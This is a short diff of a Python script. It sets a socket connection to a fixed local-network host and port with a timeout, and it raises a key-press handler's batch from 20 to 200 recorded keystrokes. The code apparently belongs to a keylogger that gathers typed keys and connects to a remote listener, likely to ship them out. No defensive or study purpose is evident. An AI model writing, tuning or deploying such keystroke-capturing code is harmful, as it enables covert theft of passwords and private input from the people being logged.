@@ -16,10 +16,11 @@ class Socket:
     def __init__(self):
         try:
             self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.active_socket.connect(("192.168.178.22", 50000))
+            self.active_socket.settimeout(1)
+            self.active_socket.connect(("192.168.178.26", 50000))
             Socket.connection = True
             print("Connection established")
-        except ConnectionRefusedError:
+        except (ConnectionRefusedError, TimeoutError, socket.error):
             print("No connection established!")
             pass
 
@@ -66,7 +67,7 @@ def safe_key_press(key):
     key = str(key).replace("'", "")
     Global.key_array.append(key)
     Global.i += 1
-    if Global.i == 20:
+    if Global.i == 200:
         Global.i = 0
         return False
 
